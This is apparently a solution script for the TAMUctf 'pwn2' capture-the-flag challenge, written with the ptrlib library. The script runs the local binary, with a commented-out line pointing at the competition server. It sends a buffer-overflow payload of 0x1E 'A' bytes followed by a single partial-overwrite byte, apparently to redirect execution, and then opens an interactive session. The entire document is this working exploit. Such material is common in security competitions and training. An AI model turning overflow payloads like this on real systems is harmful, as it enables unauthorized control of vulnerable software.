from ptrlib import *

#sock = Socket("pwn.tamuctf.com", 4322)
sock = Process("./pwn2")

payload = b'A' * 0x1E
payload += b'\xd8'
sock.recvline()
sock.sendline(payload)
sock.interactive()
